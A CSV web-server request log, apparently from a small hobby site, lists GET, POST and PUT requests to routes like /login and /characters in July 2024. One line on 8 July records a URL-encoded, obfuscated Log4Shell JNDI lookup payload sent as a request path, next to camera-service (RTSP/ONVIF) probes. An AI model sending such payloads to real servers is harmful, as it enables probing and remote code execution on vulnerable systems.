20240704,20:09:14,e926b100-12bc-442d-84d0-0724aa156c2e,GET,undefined,/login
20240704,20:09:14,bc590591-a8b2-4da4-8778-62154754ff42,GET,undefined,/css/styles.css
20240704,20:13:42,edcb4d33-490b-4dd0-a7a4-9cdb8934c13e,GET,undefined,/login
20240704,20:13:42,fcfb984d-50d5-4b7c-8ec4-9f34ae6586a6,GET,undefined,/css/styles.css
20240704,20:15:12,b2951211-d63b-4f15-8093-1f9819339b07,OPTIONS,https://www.google.com,/
20240704,20:15:12,48406518-ed25-4695-bade-d86de5959e13,GET,https://www.google.com,/
20240704,20:23:14,7f3c9f1b-4469-4924-ae59-dec8253f4427,OPTIONS,https://www.google.com,/
20240704,20:23:14,79a51c5a-ceae-4cd8-9a46-efeb4a171496,GET,https://www.google.com,/
20240704,20:23:56,c14735b5-c2dc-4ef6-9c21-b60258746d06,OPTIONS,https://www.youtube.com,/
20240704,20:23:56,d803cbc1-bfe4-4ee0-afef-6ede608aa747,GET,https://www.youtube.com,/
20240704,20:24:32,eecad874-500b-48e5-aaaa-4779031f4eaa,OPTIONS,https://www.youtube.com,/
20240704,20:24:32,f3ffe953-68a9-4c47-b6ac-5d185a95e308,GET,https://www.youtube.com,/
20240704,20:24:38,6353c6c2-bc8e-4179-b964-d064c7696480,OPTIONS,https://www.google.com,/
20240704,20:24:38,05e95ecb-738e-4ae4-bb7e-633722ca82a5,GET,https://www.google.com,/
20240704,20:24:48,864a0eae-d7fe-4fd6-8514-812116577dc1,OPTIONS,https://www.youtube.com,/
20240704,20:24:48,8665fcc3-da0e-4b14-bc68-7b85e2cc21bb,GET,https://www.youtube.com,/
20240704,20:25:38,9cecc3b7-3b91-4b17-9dc9-17919561ad5d,OPTIONS,https://www.google.com,/
20240704,20:25:38,05fa7510-b4d7-41a1-92eb-081b609ebcf7,GET,https://www.google.com,/
20240704,20:25:59,c5a3c29a-cfed-424b-9f83-77a89385ac03,OPTIONS,https://support.google.com,/
20240704,20:25:59,b47dbb19-30be-4278-a0e1-241908822e0a,GET,https://support.google.com,/
20240704,20:29:58,6a81c33e-d02f-4315-965d-44dfbab7c210,OPTIONS,https://support.google.com,/
20240704,20:29:58,d50f0783-b192-4165-852b-834faf4e0c9c,GET,https://support.google.com,/
20240704,20:30:20,6bd4f293-ca6c-4aae-995c-4d0831ca2780,GET,undefined,/login
20240704,20:30:40,b1a9efbc-2b54-4bf8-9a4b-acf5e0ae2a2a,OPTIONS,https://support.google.com,/
20240704,20:30:40,e9f2c7c8-3b7c-4824-b412-b4ee50d32de4,GET,https://support.google.com,/
20240704,20:30:46,305fa83d-fe35-4c04-9f40-03bcda0ab37a,GET,undefined,/login
20240704,20:31:34,02c3668c-624d-46f4-a898-5e01264196a9,GET,undefined,/login
20240704,20:31:34,3f628293-4627-4d2b-ad7e-fce43b7e67e9,GET,undefined,/css/styles.css
20240704,20:38:20,28f270de-8737-45c2-9bde-58662e72f59f,GET,undefined,/login
20240704,20:39:01,7166f5ab-0a65-46b2-bb80-44e397b8cc91,GET,undefined,/login
20240704,20:39:01,0fb7d1cf-3516-446e-84e1-1ab098010547,GET,undefined,/css/styles.css
20240708,16:24:56,ef8d45a4-329d-4ab9-aeea-6154081480bd,OPTIONS,undefined,rtsp://192.168.1.69/
20240708,16:24:56,59da0539-825a-4240-b86c-9644daae23a5,POST,undefined,/onvif/device_service
20240708,16:25:01,3009fbda-595f-4cdb-b3bb-1ae6799accb8,GET,undefined,/
20240708,16:25:01,4116acf2-c617-459d-abf0-9953ec020daa,GET,undefined,/%24%7B%24%7Benv%3ATEST%3A-j%7D%24%7Benv%3ATEST%3A-n%7D%24%7B%3A%3A-d%7D%24%7Benv%3ATEST%3A-i%7D%24%7B%3A%3A-%3A%7Ddn%24%7Benv%3ATEST%3A-s%7D%3A%2F%2F192.168.1.254%3A58620%2FaiHFLHeIrPJIHlhRaFBSzDZdjYnSMiEK%7D
20240708,16:25:11,94c4189b-e483-4460-abd1-d6289a1859c6,POST,undefined,/
20240710,21:33:40,c754b78e-399a-443e-8e7f-c278b0c03746,POST,undefined,/
20240710,21:34:39,20927387-03ab-474a-bb3f-914151d76913,GET,undefined,/
20240710,21:34:53,2a6363ff-c0cc-424d-bf48-26a679b51b02,GET,undefined,/id
20240710,21:50:58,fa268696-1f3f-4f1d-82a1-bd7016a3f128,GET,undefined,/
20240710,21:50:58,bd8e8901-a0f0-4e48-8438-ae0af0221187,GET,undefined,/css/styles.css
20240710,21:50:58,c71f8106-edb9-444d-8092-e944218e865e,GET,undefined,/favicon.ico
20240710,21:51:03,c598dd10-ea38-4fd1-924a-78ca9840f75c,GET,undefined,/subdir
20240710,21:52:21,7e066494-bf14-42a9-b9ec-f4867662d2e9,GET,undefined,/subdir
20240710,21:58:49,f5e994c4-e501-4f6e-ba16-25585db0c9d4,GET,undefined,/subdir
20240710,21:58:49,4f3531dc-0360-49e0-aeeb-3e001a3cb930,GET,undefined,/subdir/
20240710,21:58:53,2a046e76-53f5-4db3-8b1a-68106e4bf841,GET,undefined,/
20240710,21:58:53,880d0395-2d5b-42ed-a6b5-33a737a5d702,GET,undefined,/css/styles.css
20240710,21:58:55,799d2d43-080a-4da5-8818-3ebb417ae880,GET,undefined,/
20240710,21:58:55,7a460f5e-7dbb-4a9b-88dc-f7d891a88559,GET,undefined,/css/styles.css
20240710,21:59:01,14fe14e5-ee1f-4286-b366-4a7bd85c48f0,GET,undefined,/login
20240710,21:59:01,0d74641e-14b8-4c77-a403-41481d1343ea,GET,undefined,/css/styles.css
20240711,20:38:32,46e606e5-11c8-4f81-8af6-004626ac539f,GET,undefined,/login
20240711,20:38:32,1d16ee29-0f5a-44c6-9a45-70b3be98dfac,GET,undefined,/css/styles.css
20240711,21:03:50,9c8cf992-e537-4c60-98bc-bcf215741197,GET,undefined,/
20240711,21:03:50,cc43efb6-df72-4bef-a8dc-07cc07f9e4ef,GET,undefined,/css/styles.css
20240711,21:10:08,2f16d816-22e9-4223-aff0-6c9ab660b8f6,GET,undefined,/
20240711,21:10:08,65a1bb29-02f9-4c7d-a5b0-403c95d645a7,GET,undefined,/css/styles.css
20240711,21:10:16,7384b378-6a3e-4014-8c35-8b706347bdc5,GET,undefined,/
20240711,21:10:16,cd078b9c-d56f-408a-92fc-1cb2e8e327b5,GET,undefined,/css/styles.css
20240711,21:11:30,811ee551-a8aa-498d-9799-714b905f2352,GET,undefined,/characters
20240711,21:13:17,f3ff0ae7-f302-433b-bccf-2524543bf044,GET,undefined,/characters
20240711,21:13:28,9a7a84bd-d9ef-4c59-82ad-a4623308f3ee,POST,undefined,/characters
20240711,21:13:31,0baa3c30-838f-43ed-a597-f92f5ac3d299,POST,undefined,/characters
20240711,21:13:31,7215352a-c546-4796-9da4-236ed0858a94,POST,undefined,/characters
20240711,21:13:32,698c7be7-546e-4616-8597-1a291b444292,POST,undefined,/characters
20240711,21:13:36,8c4b14f5-0459-4c3c-80e6-90eabc735681,GET,undefined,/characters
20240711,21:13:44,45cb90b7-568c-4c08-9200-61504c8b3a82,POST,undefined,/characters
20240711,21:13:48,19d5c450-0e8d-425d-9e18-e50538c8d52c,PUT,undefined,/characters
20240711,21:18:53,37a8dede-201c-4301-86dc-d68cdb810470,PUT,undefined,/characters
20240711,21:47:59,413d688e-52ff-477f-9375-5ed9d1ad00e4,GET,undefined,/characters/5
20240711,21:48:09,07b20ad1-2b1e-4399-8976-327ea375f676,GET,undefined,/characters/id:5
20240711,21:49:07,1b885b4f-6f9e-4eff-9240-2d4333de4e70,GET,undefined,/characters/5
20240711,21:49:15,63f729fc-7892-4a57-891a-6039dfeeac58,GET,undefined,/characters/id:5
20240711,21:50:07,87189499-5ccf-4bc3-8770-dbbc122b697e,GET,undefined,/characters/5
20240711,21:51:25,7bf3bf68-d94d-4bac-ae46-f657c3c42ff9,GET,undefined,/characters/5
20240711,21:51:41,7a5c35a7-ac78-43ae-9b26-8a846c2ec640,GET,undefined,/characters/5
20240711,21:51:49,37066eb2-9096-43ef-bc2a-5f3c6b7dbf35,GET,undefined,/characters/
20240711,21:58:10,ad4f5698-6099-47e3-8f2f-4d5bcfd71fa5,GET,undefined,/characters/5
20240711,21:59:57,6d4c0663-c949-48e0-8997-871c39874bdf,PUT,undefined,/characters/
20240711,22:01:39,4bf43965-4d39-4b20-ae64-494726118125,PUT,undefined,/characters/
20240711,22:02:24,042358bf-40da-47d1-b0e6-98cd0f980a62,PUT,undefined,/characters/
